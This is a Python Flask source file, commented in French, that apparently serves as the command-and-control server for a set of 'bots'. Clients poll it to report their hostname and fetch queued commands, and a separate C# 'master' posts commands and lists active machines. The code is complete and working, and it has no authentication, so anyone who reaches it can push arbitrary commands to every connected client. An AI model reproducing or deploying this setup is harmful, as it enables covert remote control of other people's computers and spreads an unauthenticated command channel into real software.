from flask import Flask, request, jsonify
from datetime import datetime, timedelta

app = Flask(__name__)

# Stockage des commandes et infos client
# Structure: clientid: {"cmd": "commande", "nonce": 123, "last_seen": datetime, "hostname": "MSI"}
commands = {}

# Le client est considéré comme hors ligne après cette période sans heartbeat
HEARTBEAT_TIMEOUT = timedelta(seconds=30)  

@app.route('/getcommand/<clientid>', methods=['GET'])
def get_command(clientid):
    """
    Endpoint utilisé par le client (bot) pour:
    1. Envoyer son hostname (via paramètre de requête).
    2. Maintenir le heartbeat (mettre à jour last_seen).
    3. Récupérer la commande en attente et le nonce.
    """
    now = datetime.utcnow()
    
    # Récupérer le paramètre hostname (du query string: ?hostname=MSI)
    hostname = request.args.get('hostname', 'Inconnu') 
    
    if clientid not in commands:
        # Client nouveau
        commands[clientid] = {
            "cmd": "", 
            "nonce": -1, 
            "last_seen": now, 
            "hostname": hostname
        }
    else:
        # Client existant (Heartbeat)
        commands[clientid]["last_seen"] = now
        # Optionnel: Mettre à jour le hostname s'il change
        commands[clientid]["hostname"] = hostname

    # Réponse envoyée au client
    data = {
        "cmd": commands[clientid]["cmd"], 
        "nonce": commands[clientid]["nonce"]
    }
    return jsonify(data), 200

@app.route('/postcommand/<clientid>', methods=['POST'])
def post_command(clientid):
    """
    Endpoint utilisé par le master (votre application C#) pour envoyer une commande.
    Expects JSON: {"cmd": "ping 127.0.0.1", "nonce": 42}
    """
    data = request.get_json()
    if not data:
        return jsonify({"message": "JSON manquant"}), 400

    cmd = data.get("cmd", "")
    nonce = data.get("nonce", 0)

    now = datetime.utcnow()
    
    # Conserver le hostname existant s'il y en a un pour ne pas le perdre
    existing_hostname = commands.get(clientid, {}).get("hostname", "Non renseigné")
    
    commands[clientid] = {
        "cmd": cmd, 
        "nonce": nonce, 
        "last_seen": now,
        "hostname": existing_hostname  # Conserver le hostname
    }
    return jsonify({"message": f"Commande '{cmd}' enregistrée pour {clientid}"}), 200

@app.route('/listclients', methods=['GET'])
def list_clients():
    """
    Endpoint utilisé par le master (votre application C#) pour lister tous les clients actifs
    avec leurs informations complètes (ID, hostname, dernière activité).
    """
    now = datetime.utcnow()
    
    active_clients_info = []
    
    for cid, info in commands.items():
        # Vérifier si le client est actif (heartbeat dans la limite)
        if now - info["last_seen"] <= HEARTBEAT_TIMEOUT:
            active_clients_info.append({
                "clientid": cid,
                "hostname": info.get("hostname", "N/A"),
                # Format ISO pour la désérialisation en C#
                "last_seen": info["last_seen"].isoformat() + "Z", 
                "current_cmd": info["cmd"],
                "nonce": info["nonce"]
            })
            
    # Vous pouvez ajouter un tri ici (ex: par hostname) si vous le souhaitez
    # active_clients_info.sort(key=lambda x: x['hostname'])
    
    return jsonify(active_clients_info), 200

if __name__ == '__main__':
    # Lance le serveur en écoutant toutes les interfaces sur le port 8000
    app.run(host='0.0.0.0', port=8000)
